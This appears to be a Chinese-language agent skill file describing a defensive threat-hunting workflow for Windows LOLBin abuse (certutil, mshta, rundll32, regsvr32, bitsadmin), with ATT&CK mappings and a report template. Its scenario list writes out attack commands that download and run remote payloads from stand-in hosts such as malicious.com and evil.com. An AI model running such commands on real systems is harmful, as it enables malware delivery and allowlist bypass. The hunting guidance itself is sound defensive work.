---
id: hunting-for-living-off-the-land-binaries
name: hunting-for-living-off-the-land-binaries
name_zh: 威胁狩猎·离地·离地·落地·二进制
description: 主动猎杀滥用合法系统二进制（LOLBins）在规避检测的情况下执行恶意载荷的行为。
domain: cybersecurity
subdomain: threat-hunting
tags:
- threat-hunting
- mitre-attack
- lolbins
- edr
- siem
- proactive-detection
- defense-evasion
version: '1.0'
author: mahipal
license: Apache-2.0
locale: zh-CN
neo_agents:
- forensic
- general_chat
---

# 威胁狩猎·离地·离地·落地·二进制

## 使用时机

- 调查绕过传统杀软的无文件恶意软件活动
- 针对防御规避技术的主动威胁猎杀
- EDR 对合法二进制执行异常子进程告警时
- 威胁情报通报活跃活动中滥用 LOLBin 时
- 红队/紫队演练中验证 T1218 检测覆盖

## 前置条件

- EDR 遥测访问（CrowdStrike、Microsoft Defender for Endpoint、SentinelOne）
- 含进程创建日志的 SIEM（Sysmon 事件 ID 1、Windows 安全 4688）
- 熟悉 LOLBAS 项目（lolbas-project.github.io）参考列表
- 已启用 PowerShell 命令行日志（模块日志、脚本块日志）
- 用于关联出站连接的代理或防火墙日志

## 工作流程

1. **定义猎杀假设**：基于威胁情报形成假设（例如：「对手使用 certutil.exe 从外域下载第二阶段载荷」）。
2. **选定目标 LOLBin**：从 LOLBAS 数据库选取待猎杀二进制，按当前威胁态势排序（certutil、mshta、rundll32、regsvr32、msiexec、wmic、cmstp、bitsadmin 等）。
3. **采集进程遥测**：在 EDR 或 SIEM 中查询涉及目标 LOLBin 的进程创建，关注异常命令行参数、父进程或执行上下文。
4. **建立正常行为基线**：分析历史频率、典型父进程与标准参数，明确各 LOLBin 在环境中的合法用法。
5. **识别异常**：相对基线标记含网络连接、编码命令、异常路径或异常父子链的执行。
6. **关联与富集**：将异常 LOLBin 活动与网络日志、DNS、文件创建及威胁情报交叉引用。
7. **记录与报告**：记录发现、更新检测规则并整理 IOC 列表。

## 关键概念

| 概念 | 说明 |
|---------|-------------|
| LOLBin | 被攻击者滥用的合法操作系统二进制 |
| LOLBAS 项目 | 社区维护的 Windows LOLBin、LOLLib、LOLScript 列表 |
| T1218 | MITRE ATT&CK——签名的二进制代理执行 |
| T1218.001 | 编译的 HTML 文件（mshta.exe） |
| T1218.002 | 控制面板（control.exe） |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 |
| T1218.011 | Rundll32 |
| T1197 | BITS 作业（bitsadmin.exe） |
| T1140 | 去混淆/解码文件（certutil.exe） |
| 代理执行 | 使用受信任二进制执行非信任代码 |
| 无文件攻击 | 主要在内存中运行、不落盘的攻击 |

## 工具与系统

| 工具 | 用途 |
|------|---------|
| CrowdStrike Falcon | EDR 遥测与进程树分析 |
| Microsoft Defender for Endpoint | KQL 高级搜寻 |
| Splunk | SIEM 汇聚与 SPL |
| Elastic Security | 检测规则与时间线调查 |
| Sysmon | 详细进程创建与网络日志 |
| LOLBAS 项目 | LOLBin 能力参考库 |
| Sigma 规则 | LOLBin 通用检测规则格式 |
| Velociraptor | 端点取证采集与猎杀 |

## 常见场景

1. **Certutil 下载 cradle**：`certutil.exe -urlcache -split -f http://malicious.com/payload.exe` 下载恶意软件，在允许 certutil 流量的代理下绕过过滤。
2. **Mshta HTA 执行**：攻击者通过邮件投递 HTA，经 `mshta.exe` 执行 VBScript 载荷（签名微软二进制）。
3. **Rundll32 DLL 代理加载**：经 `rundll32.exe shell32.dll,ShellExec_RunDLL` 等加载恶意 DLL。
4. **Regsvr32 Squiblydoo**：`regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` 绕过应用白名单。
5. **BITSAdmin 持久化**：对手创建 BITS 传输作业，用 `bitsadmin /transfer` 反复下载并执行载荷。

## 输出格式

```
猎杀 ID: TH-LOLBIN-[DATE]-[SEQ]
假设: [陈述的假设]
调查的 LOLBin: [二进制列表]
时间范围: [开始] - [结束]
数据源: [EDR、Sysmon、SIEM]
发现:
  - [发现 1 及证据]
  - [发现 2 及证据]
检出异常数: [数量]
真阳性: [数量]
误报: [数量]
识别的 IOC: [列表]
创建/更新的检测规则: [列表]
建议: [后续步骤]
```